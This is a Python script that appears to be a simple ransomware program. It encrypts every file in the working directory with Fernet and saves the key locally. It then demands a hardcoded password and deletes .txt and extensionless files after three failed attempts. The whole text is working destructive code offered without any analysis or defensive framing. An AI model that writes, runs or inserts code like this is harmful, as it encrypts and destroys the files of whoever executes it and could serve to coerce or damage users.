import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "generatedkey.key" or file == "ransomdecrypter.py":
		continue #do not encrypt the current file we are working with or the key
	if os.path.isfile(file):
		files.append(file) #do not add if this is a directory, only if a file

for i in files:
	print(i)

key = Fernet.generate_key()

with open("generatedkey.key","wb") as generatedkey:
	generatedkey.write(key)

for file in files:
	with open(file,"rb") as the_file:
		contents = the_file.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file,"wb") as the_file:
		the_file.write(contents_encrypted)

print("\nWelcome.\nThis file is encrypted. You must type the password to access the file. The documents on your 3rd page will be deleted. Do you want to log in?(Yes or No) \n")

while True:
	try:
		login = input(" INPUT: ")
		if login == "Yes" or login == "yes":
			repeat = 3
			while repeat > 0:
				password = input("\n(back = ctrl c)\nEnter password: ")
				while True:
					try:
						if password == "Cavid":
							print("\nTrue password.\nYou can access the documents.")
							with open("generatedkey.key", "rb") as generatedkey:
								secret_key = generatedkey.read()

							for file in files:
								with open(file, "rb") as the_file:
									contents = the_file.read()

								contents_decrypted = Fernet(secret_key).decrypt(contents)

								with open(file, "wb") as the_file:
									the_file.write(contents_decrypted)
							break
						else:
							repeat -= 1
							if repeat == 0:
								for f in files:
									extentsion = os.path.splitext(f)
									if extentsion[-1] == ".txt" or extentsion[-1] == "":
										os.remove(f)
									else:
										continue
								print("Everything was deleted")
								break
							else:
								print(f"\n(close = ctrl c)\nYou have {repeat} chance left")
								password = input("Repeat password: ")
					except:
						print("\nYou closed!")
						break
				break
		elif login == "No" or login == "no":
			print("Good Bye!")
			break
		else:
			print("Yes or No!!!")
			continue
	except:
		print("\nOpen - Yes\nExit - No")
		continue
	break











